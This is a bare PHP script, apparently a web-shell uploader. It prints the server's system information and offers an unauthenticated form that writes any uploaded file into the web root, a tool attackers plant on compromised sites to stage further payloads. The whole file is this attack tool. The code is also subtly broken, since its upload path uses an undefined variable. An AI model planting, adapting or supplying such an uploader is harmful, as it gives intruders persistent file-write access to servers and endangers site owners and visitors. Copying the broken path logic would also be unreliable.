<?php
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='x'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$r = $_SERVER['DOCUMENT_ROOT'];
$f = $_FILES['x']['name'];
$d = $r.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($r)) {
		if(@copy($_FILES['x']['tmp_name'], $d)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Upload : <a href='$web$f' target='_blank'><b><u>$web$f</u></b></a>";
		} else {
			echo "Fail.";
		}
	} else {
		if(@copy($_FILES['x']['tmp_name'], $f)) {
			echo "Upload : <b>$f</b>";
		} else {
			echo "Fail.";
		}
	}
}
?>
